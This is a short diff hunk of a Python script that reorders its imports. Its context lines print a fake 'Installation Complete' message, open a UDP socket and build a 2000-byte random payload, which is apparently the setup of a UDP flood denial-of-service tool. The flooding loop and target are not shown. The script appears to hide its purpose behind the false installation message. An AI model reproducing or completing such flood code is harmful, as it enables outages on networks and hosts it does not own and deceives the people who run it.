@@ -1,8 +1,8 @@
-import os
-import random
-import requests
-import socket
 import sys
+import os
+import time
+import socket
+import random
 print("Installation Complete")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(2000)
